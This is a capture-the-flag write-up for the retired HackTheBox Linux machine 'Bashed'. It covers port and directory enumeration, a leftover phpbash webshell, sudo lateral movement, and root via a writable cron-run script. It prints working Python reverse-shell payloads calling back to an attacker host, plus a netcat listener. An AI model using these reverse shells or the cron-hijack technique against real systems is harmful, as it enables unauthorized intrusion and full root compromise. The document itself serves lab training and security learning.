# HackTheBox — Bashed

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Linux  
**Category:** Web Exploitation / PHP Webshell / Cron Job  
**Status:** Retired  

---

## Summary

Bashed features a PHP webshell (`phpbash`) that the developer left on the production server after using it for development. Finding the webshell provides instant code execution. Privilege escalation first moves from `www-data` to `scriptmanager` via sudo, then exploits a root-owned cron running scripts in a world-writable directory.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/bashed 10.10.10.68
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18
```

Only port 80.

---

## Web Enumeration

The homepage mentions the developer built **phpbash** on this server. Time to find it.

```bash
gobuster dir -u http://10.10.10.68/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php
```

```
/uploads/
/images/
/php/
/css/
/dev/      ← interesting
```

Visiting `/dev/`:

```
phpbash.min.php
phpbash.php
```

---

## Exploitation

Navigating to `http://10.10.10.68/dev/phpbash.php` gives a full in-browser shell as **www-data**.

Upgrade to a reverse shell for stability:

```bash
# In phpbash
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.X",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## User Flag

```bash
cat /home/arrexel/user.txt
```

---

## Privilege Escalation — www-data → scriptmanager

```bash
sudo -l
```

```
(scriptmanager : scriptmanager) NOPASSWD: ALL
```

Switch to scriptmanager:

```bash
sudo -u scriptmanager /bin/bash
```

---

## Privilege Escalation — scriptmanager → root

### Writable Scripts Directory

```bash
ls -la /
```

```
drwxrwxr--  2 scriptmanager scriptmanager 4096 Dec  4  2017 scripts
```

The `/scripts` directory is owned by scriptmanager and writable.

```bash
ls -la /scripts/
```

```
-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py
-rw-r--r-- 1 root          root          12 Feb  6 06:29 test.txt
```

`test.txt` is **owned by root** and recently modified — root is running `test.py` via a cron job!

### Exploit the Cron

Replace `test.py` with a reverse shell:

```bash
cat > /scripts/test.py << 'EOF'
import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.10.14.X", 5555))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
EOF
```

Start a listener:

```bash
nc -lvnp 5555
```

Wait up to 60 seconds — **root shell obtained**.

---

## Root Flag

```bash
cat /root/root.txt
```

---

## Key Takeaways

- **Never leave development tools on production servers** — phpbash is a full RCE webshell
- `sudo -u otheruser /bin/bash` can laterally move between users
- Look for directories owned by your current user — writable script paths near root processes are gold
- When `test.txt` is owned by root but the `.py` script is writable by you — root's cron is executing it
- `ls -la /` is often overlooked — check root directory permissions carefully

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| gobuster | Web enumeration |
| phpbash | Built-in webshell |
| Python | Reverse shell payload |
| netcat | Listener |
